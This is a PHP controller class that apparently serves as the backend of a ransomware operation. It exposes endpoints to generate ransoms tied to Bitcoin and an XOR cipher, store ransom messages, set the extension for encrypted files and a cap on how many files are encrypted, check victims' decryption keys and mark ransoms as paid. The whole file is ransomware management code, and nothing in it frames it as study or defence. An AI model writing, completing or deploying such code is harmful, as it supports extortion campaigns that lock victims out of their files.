<?php

namespace SmallPHP\Controller;

require_once __DIR__ . "/controller.php";
require_once __DIR__ . "/../services/ransom_service.php";
require_once __DIR__ . "/../models/cipher/cipher_type.php";
require_once __DIR__ . "/../models/cryptocurrency/crypto_type.php";

use SmallPHP\CurrentJwt\TokenData;
use SmallPHP\Models\CipherType;
use SmallPHP\Models\CryptoType;
use SmallPHP\Services\RansomService;

class RansomController extends Controller
{
    private RansomService $service;

    public function __construct(array $endpoint, ?TokenData $token_data, string $method, RansomService $cipher_service)
    {
        parent::__construct($endpoint, $token_data, $method);

        $this->service = $cipher_service;

        $this->add_endpoint("GET", "", [$this, "create_ransom"]);
        $this->add_endpoint("GET", "id/{string:id}", [$this, "fetch_ransom"]);
        $this->add_endpoint("GET", "{string:id}/{string:key}", [$this, "check_decryption_key"]);
        $this->add_endpoint("GET", "list", [$this, "get_all_ransoms"]);
        $this->add_endpoint("PUT", "{string:id}", [$this, "update_ransom"]);
        $this->add_endpoint("POST", "", [$this, "create_premake_ransom"]);
        $this->add_endpoint("PATCH", "{string:id}", [$this, "set_paid_ransom"]);
        $this->add_endpoint("DELETE", "{string:id}", [$this, "delete_ransom"]);
    }

    public function update_ransom(array $query_params, HttpResponse $response): void
    {
        $ransom = $this->service->fetch_ransom($query_params["id"]);
        $to_edit = $this->get_body_from_json();
        if($ransom === null)
        {
            $response->status_code = 404;
            $response->body = "Ransom not found";
            return;
        }

        $this->service->update_ransom($ransom, $to_edit);
        $response->headers["Content-Type"] = "application/json";
        $response->status_code = 204;
    }

    public function create_premake_ransom(array $query_params, HttpResponse $response): void
    {
        $ransom_params = $this->get_body_from_json();
        if(!$this->check_ransom_params($ransom_params))
        {
            $response->status_code = 400;
            $response->body = "Invalid ransom parameters";
            return;
        }

        $this->service->create_premake_ransom($ransom_params);
        $response->status_code = 201;
    }

    public function get_all_ransoms(array $query_params, HttpResponse $response): void
    {
        $ransoms = $this->service->get_all_ransoms();
        $response->body = json_encode($ransoms);
        $response->headers["Content-Type"] = "application/json";
        $response->status_code = 200;
    }

    public function create_ransom(array $query_params, HttpResponse $response): void
    {
        try
        {
            $ransom = $this->service->create_ransom(CryptoType::CRYPTO_TYPE_BTC, CipherType::CIPHER_TYPE_XOR);
            $response->body = $ransom->encrypt_json();
            $response->headers["Content-Type"] = "application/json";
            $response->status_code = 200;
        }
        catch (\Exception $e)
        {
            $response->status_code = 500;
            $response->body = $e->getMessage();
        }
    }

    public function delete_ransom(array $query_params, HttpResponse $response): void
    {
        $deleted = $this->service->delete_ransom($query_params["id"]);
        if(!$deleted)
        {
            $response->status_code = 404;
            $response->body = "Ransom not found";
            return;
        }

        $response->status_code = 204;
    }

    public function set_paid_ransom(array $query_params, HttpResponse $response): void
    {
        $ransom = $this->service->fetch_ransom($query_params["id"]);
        if($ransom === null)
        {
            $response->status_code = 404;
            $response->body = "Ransom not found";
            return;
        }

        $this->service->set_paid_ransom($ransom);
        $response->headers["Content-Type"] = "application/json";
        $response->status_code = 204;
    }

    public function fetch_ransom(array $query_params, HttpResponse $response): void
    {
        try
        {
            $ransom = $this->service->fetch_ransom($query_params["id"]);
            if($ransom === null)
            {
                $response->status_code = 404;
                $response->body = "Ransom not found";
                return;
            }
            $response->body = $ransom->encrypt_json();
            $response->headers["Content-Type"] = "application/json";
            $response->status_code = 200;
        }
        catch (\Exception $e)
        {
            $response->status_code = 500;
            $response->body = $e->getMessage();
        }
    }

    public function check_decryption_key(array $query_params, HttpResponse $response): void
    {
        $id = $query_params["id"];
        $key = $query_params["key"];

        if($this->service->check_key_for_id($id, $key))
        {
            $response->status_code = 200;
            $response->body = "OK";
        }
        else
        {
            $response->status_code = 404;
            $response->body = "ERROR";
        }
    }

    public function get_name(): string
    {
        return "ransoms";
    }

    private function check_ransom_params(array $ransom_params): bool
    {
        return isset($ransom_params["cipherType"]) && is_string($ransom_params["cipherType"]) &&
            isset($ransom_params["cryptoType"]) && is_string($ransom_params["cryptoType"]) &&
            isset($ransom_params["cryptoAmount"]) && is_float($ransom_params["cryptoAmount"]) &&
            isset($ransom_params["extension"]) && is_string($ransom_params["extension"]) && preg_match("/\.[a-zA-Z0-9]{1,32}/", $ransom_params["extension"]) &&
            isset($ransom_params["message"]) && is_string($ransom_params["message"]) &&
            isset($ransom_params["maxEncrypt"]) && is_int($ransom_params["maxEncrypt"]);
    }
}
